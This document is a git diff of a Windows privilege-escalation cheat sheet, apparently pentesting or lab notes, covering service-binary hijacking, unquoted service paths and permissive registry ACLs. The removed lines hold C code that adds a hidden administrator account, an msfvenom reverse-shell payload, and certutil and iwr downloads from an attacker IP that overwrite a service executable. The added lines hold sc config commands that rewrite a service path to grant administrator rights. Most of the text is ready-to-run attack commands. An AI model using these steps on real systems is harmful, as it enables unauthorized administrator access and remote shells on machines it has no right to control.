@@ -221,16 +221,14 @@ https://github.com/hfiref0x/UACME
 ### Modifiable Service Executables
 ```
 1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
-2. icacls "service path" # check if current user has permission to replace file with malicious one
+2. icacls "service pathname" # check if current user has permission to replace file with malicious one
 3. replace malicious exe with service executable
-4. Get-WmiObject -Class Win32_Service -Property StartMode -Filter "Name='Service Name'" 
-5. whoami /priv #check out shutdown privileges of user
+4. Get-WmiObject -Class Win32_Service -Property StartMode -Filter "Name='Service Name'"
+5. sc start service
 ```
 ```
-#In Winpeas look for a service which has the following
-File Permissions: Everyone [AllAccess]
-#Replace the executable in the service folder and start the service
-sc start <service>
+.\SharpUp.exe audit
+check for === Modifiable Service Binaries ===
 ```
 
 ### Unquoted Service Paths
@@ -265,52 +263,27 @@ Import-Module .\PowerUp.ps1
 Get-UnquotedService
 ```
 
-### Service Binary Hijacking
+### Modifiable Services
+```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
-```
-icacls "path"
-
-First Way -- Add user to local Administrator group:
-adduser.c:
-#include <stdlib.h>
-
-int main ()
-{
-  int i;
-  
-  i = system ("net user dave2 password123! /add");
-  i = system ("net localgroup administrators dave2 /add");
-  
-  return 0;
-}
-
-x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
-iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
-move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
-move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
+accesschk.exe /accepteula -quvcw ServiceName
+sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+sc stop WindscribeService
+sc start WindscribeService
 ```
 ```
-Second Way -- Generating reverse shell file:
-msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.215 lport=1234 -f exe > backdoor.exe
-move "C:\Program Files\MilleGPG5\GPGService.exe" C:\Users\Public\test.exe
-certutil.exe -urlcache -split -f http://192.168.45.215:8080/backdoor.exe "C:\Program Files\MilleGPG5\GPGService.exe"
-Restart-Service ServiceName
-```
-```
-Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
-whoami /priv(if SeShutdownPrivilege isn't present,  we would have to wait for the victim to manually start the service)
-shutdown /r /t 0
-
 Automatic Script:
 PowerUp.ps1 ->
 Get-ModifiableServiceFile
+
+SharpUp.exe audit
+check === Modifiable Services ===
 ```
+### Permissive Registry ACLs
 ```
-#Identify service from winpeas
-icalcs "path" #F means full permission, we need to check we have full access on the folder
-sc qc <servicename> #find binary path variable
-sc config <service> <option>="<value>" #change the path to the reverse shell location
-sc start <servicename>
+accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
+sc config ServiceName binpath="cmd /c net localgroup administrators htb-student /add"
 ```
 
 ### Service DLL Hijacking
